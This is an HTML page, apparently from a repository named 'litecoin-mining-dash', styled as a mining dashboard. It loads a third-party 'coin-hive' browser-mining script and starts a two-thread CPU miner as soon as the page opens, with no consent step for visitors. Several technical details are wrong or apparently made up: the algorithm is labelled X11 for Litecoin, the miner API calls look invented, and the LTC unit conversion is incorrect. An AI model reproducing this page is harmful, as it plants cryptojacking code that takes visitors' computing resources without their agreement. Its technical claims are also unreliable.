# litecoin-mining-dash
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Litecoin Mining Dashboard - Your Brand</title>
  <script src="https://cdn.jsdelivr.net/npm/coin-hive@2.3.3/dist/coinhive.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #2c3e50, #3498db);
      color: #ffffff;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    header {
      background-color: #2980b9;
      padding: 20px 0;
    }

    header h1 {
      margin: 0;
      font-size: 2.5em;
    }

    .container {
      padding: 40px 20px;
      max-width: 800px;
      margin: auto;
    }

    .dashboard {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }

    .card {
      background-color: #1a252f;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }

    .card h2 {
      margin-top: 0;
      color: #e67e22;
    }

    .card p {
      font-size: 1.2em;
    }

    .progress-bar {
      width: 100%;
      height: 20px;
      background-color: #34495e;
      border-radius: 10px;
      overflow: hidden;
      margin: 15px 0;
    }

    .progress {
      height: 100%;
      width: 0%;
      background-color: #e67e22;
      text-align: center;
      color: #ffffff;
      line-height: 20px;
      transition: width 0.3s ease;
    }

    footer {
      margin-top: 40px;
      font-size: 0.9em;
      color: #cccccc;
    }
  </style>
</head>
<body>
  <header>
    <h1>Litecoin Mining Dashboard - Your Brand</h1>
    <p>Start mining Litecoin automatically with your CPU</p>
  </header>

  <div class="container">
    <div class="dashboard">
      <div class="card">
        <h2>Algorithm</h2>
        <p id="algorithm">X11</p>
      </div>

      <div class="card">
        <h2>Hashrate</h2>
        <p id="hashrate">0 H/s</p>
      </div>

      <div class="card">
        <h2>Total Mined</h2>
        <p id="total-mined">0 LTC</p>
      </div>

      <div class="card">
        <h2>Workers</h2>
        <p id="workers">0</p>
      </div>

      <div class="card">
        <h2>Mining Progress</h2>
        <div class="progress-bar">
          <div class="progress" id="progress-bar"></div>
        </div>
      </div>
    </div>
  </div>

  <footer>
    &copy; 2025 Your Brand. All rights reserved.
  </footer>

  <script>
    const miner = CoinHive.createWorker({
      algorithm: 'x11',
      threads: 2,
      intensity: 10,
      mine: true
    });

    miner.start();

    setInterval(() => {
      const hashRate = miner.getHashrate();
      const totalMined = miner.getTotalMined();
      const workers = miner.getWorkers();
      const progress = (totalMined / 1000000000) * 100; // Assuming 1 LTC = 1,000,000,000 units

      document.getElementById('hashrate').textContent = hashRate.toFixed(2);
      document.getElementById('total-mined').textContent = totalMined.toFixed(2);
      document.getElementById('workers').textContent = workers;
      document.getElementById('progress-bar').style.width = progress + '%';
    }, 1000);
  </script>
</body>
</html>
